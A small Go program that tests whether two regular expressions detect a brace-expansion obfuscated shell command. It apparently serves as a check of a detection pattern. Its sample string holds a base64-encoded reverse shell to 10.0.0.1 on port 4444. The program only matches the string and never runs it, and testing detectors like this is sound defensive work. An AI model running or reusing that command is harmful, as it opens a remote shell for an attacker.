package main

import (
	"fmt"
	"regexp"
)

func main() {
	cmd := `bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjF9|{base64,-d}|{bash,-i}"`
	re, err := regexp.Compile(`(?i)\{echo,`)
	fmt.Println("Compile error:", err)
	fmt.Println("Match:", re.MatchString(cmd))

	re2, err2 := regexp.Compile(`(?i)\{echo`)
	fmt.Println("Compile error 2:", err2)
	fmt.Println("Match 2:", re2.MatchString(cmd))
}
